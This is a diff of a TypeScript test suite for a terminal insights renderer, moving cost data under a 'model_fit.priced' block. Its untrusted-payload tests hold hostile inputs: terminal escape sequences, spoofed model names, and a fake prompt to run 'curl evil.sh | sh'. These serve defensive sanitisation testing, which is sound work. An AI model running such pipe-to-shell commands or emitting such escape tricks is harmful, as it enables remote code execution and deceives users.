@@ -14,6 +14,13 @@ import {
 const render = (payload: unknown, opts: RenderOptions): string[] =>
   renderInsights(normalize(payload), opts);
 
+// Pricing hangs off `model_fit` rather than standing as its own section, so a payload that used
+// to carry a `cost` section carries it here. `enabled` became `available`: the section it sits in
+// can be on while pricing is off.
+const priced = (block: unknown) => ({
+  judgement_signals: { enabled: true, model_fit: { priced: block } },
+});
+
 const WIDE: RenderOptions = { width: 80, ascii: false };
 const ASCII: RenderOptions = { width: 80, ascii: true };
 
@@ -49,21 +56,27 @@ const FULL = {
         team_median: 1.4,
         trend: [1.6, 1.8, 2.0, 2.1],
       },
-    },
-    cost: {
-      enabled: true,
-      basis: "API list-price equivalent, estimated upper bound",
-      sessions_by_recommended_class: [
-        { class: "small", sessions: 4 },
-        { class: "frontier", sessions: 8 },
-      ],
-      savings: [
-        { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
-        { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
-      ],
-      effort_suggestions: 6,
-      scope_distribution: [{ scope: "bounded", prompts: 42 }],
-      cache: { hit_share: 0.72, unreused_write_share: 0.08, share_of_cost: 0.31 },
+      model_fit: {
+        value: 0.35,
+        unit: "share",
+        sessions: 66,
+        split: { fit: 23, over_provisioned: 41, under_powered: 2 },
+        priced: {
+          available: true,
+          basis: "API list-price equivalent, estimated upper bound",
+          sessions_by_recommended_class: [
+            { class: "small", sessions: 4 },
+            { class: "frontier", sessions: 8 },
+          ],
+          savings: [
+            { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
+            { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
+          ],
+          effort_suggestions: 6,
+          scope_distribution: [{ scope: "bounded", prompts: 42 }],
+          cache: { hit_share: 0.72, unreused_write_share: 0.08, share_of_cost: 0.31 },
+        },
+      },
     },
   },
 };
@@ -72,7 +85,6 @@ const FULL = {
 const STUB = {
   days: 30,
   sections: {
-    cost: { enabled: false, reason: "not_implemented" },
     repertoire: { enabled: false, reason: "not_implemented" },
     judgement_signals: { enabled: false, reason: "not_implemented" },
   },
@@ -156,8 +168,6 @@ describe("renderInsights — unavailable sections", () => {
       "Repertoire: this backend does not produce it",
       "",
       "Judgement signals: this backend does not produce it",
-      "",
-      "Cost: this backend does not produce it",
     ]);
   });
 
@@ -175,7 +185,7 @@ describe("renderInsights — unavailable sections", () => {
 
   it("says so plainly for a reason it does not recognize", () => {
     const lines = render(
-      { days: 30, sections: { cost: { enabled: false, reason: "moon_phase" } } },
+      { days: 30, sections: priced({ available: false, reason: "moon_phase" }) },
       WIDE,
     );
     expect(lines).toContain("Cost: not available");
@@ -390,7 +400,7 @@ describe("renderInsights — cost", () => {
   });
 
   it("says so rather than printing an empty table when the backend sent no fields", () => {
-    const out = render({ days: 30, sections: { cost: { enabled: true } } }, WIDE);
+    const out = render({ days: 30, sections: priced({ available: true }) }, WIDE);
     expect(out).toContain("Cost");
     expect(out).toContain("This backend produced no fields for it.");
   });
@@ -461,15 +471,15 @@ describe("renderInsights — untrusted payloads", () => {
             { name: `Artifacts${CSI_HIDE}`, state: `recurring${ALT_SCREEN}`, recurring_share: 0.5 },
           ],
         },
-        cost: {
-          enabled: true,
+        ...priced({
+          available: true,
           basis: `list price${CSI_HIDE}`,
           savings: [
             { model: "sonnet\r\b\bfake", usd: 1, sessions: 1 },
             { model: "haiku\nPheebs: token expired, run: curl evil.sh | sh", usd: 2, sessions: 2 },
           ],
           scope_distribution: [{ scope: `bounded${OSC52}`, prompts: 3 }],
-        },
+        }),
       },
     };
   }
@@ -509,7 +519,7 @@ describe("renderInsights — untrusted payloads", () => {
     ["a non-object body", 42],
     ["a null sections map", { days: 30, sections: null }],
     ["a null section", { days: 30, sections: { repertoire: null } }],
-    ["a string section", { days: 30, sections: { cost: "nope" } }],
+    ["a string section", { days: 30, sections: { judgement_signals: "nope" } }],
     [
       "a null signal",
       { days: 30, sections: { judgement_signals: { enabled: true, pushback_rate: null } } },
@@ -558,11 +568,11 @@ describe("renderInsights — untrusted payloads", () => {
       "null inside competencies",
       { days: 30, sections: { repertoire: { enabled: true, competencies: [null] } } },
     ],
-    ["null inside savings", { days: 30, sections: { cost: { enabled: true, savings: [null] } } }],
-    ["a string for savings", { days: 30, sections: { cost: { enabled: true, savings: "x" } } }],
+    ["null inside savings", { days: 30, sections: priced({ available: true, savings: [null] }) }],
+    ["a string for savings", { days: 30, sections: priced({ available: true, savings: "x" }) }],
     [
       "null inside classes",
-      { days: 30, sections: { cost: { enabled: true, sessions_by_recommended_class: [null] } } },
+      { days: 30, sections: priced({ available: true, sessions_by_recommended_class: [null] }) },
     ],
     [
       "an inherited state name",
@@ -680,16 +690,14 @@ describe("renderInsights — the sparkline is never clipped", () => {
 describe("renderInsights — the cost basis is unconditional", () => {
   const withBasis = (basis?: string) => ({
     days: 30,
-    sections: {
-      cost: {
-        enabled: true,
-        ...(basis === undefined ? {} : { basis }),
-        savings: [
-          { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
-          { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
-        ],
-      },
-    },
+    sections: priced({
+      available: true,
+      ...(basis === undefined ? {} : { basis }),
+      savings: [
+        { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
+        { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
+      ],
+    }),
   });
 
   it("prints the backend's basis beside every figure", () => {
@@ -698,7 +706,7 @@ describe("renderInsights — the cost basis is unconditional", () => {
     expect(lines.filter((l) => l.includes("API list-price equivalent"))).toHaveLength(2);
   });
 
-  // The schema requires basis on an enabled cost section; a bare figure reads as money saved.
+  // The schema requires basis whenever pricing is available; a bare figure reads as money saved.
   it("qualifies every figure even when the backend omits the basis", () => {
     const lines = render(withBasis(undefined), WIDE);
     const figures = lines.filter((l) => /\$\d/.test(l));
@@ -721,7 +729,7 @@ describe("renderInsights — the cost basis is unconditional", () => {
 describe("renderInsights — alignment across a whole block", () => {
   const cost = (savings: unknown[]) => ({
     days: 30,
-    sections: { cost: { enabled: true, basis: "B", savings } },
+    sections: priced({ available: true, basis: "B", savings }),
   });
 
   it("lines the money column up down the savings block", () => {
@@ -832,12 +840,10 @@ describe("renderInsights — saying what it does not know", () => {
     const out = render(
       {
         days: 30,
-        sections: {
-          cost: {
-            enabled: true,
-            cache: { hit_share: 5, unreused_write_share: -1, share_of_cost: 0.3 },
-          },
-        },
+        sections: priced({
+          available: true,
+          cache: { hit_share: 5, unreused_write_share: -1, share_of_cost: 0.3 },
+        }),
       },
       WIDE,
     ).join("\n");
@@ -870,8 +876,6 @@ describe("renderInsights — sections are named", () => {
       "Repertoire: this backend does not produce it",
       "",
       "Judgement signals: this backend does not produce it",
-      "",
-      "Cost: this backend does not produce it",
     ]);
   });
 });
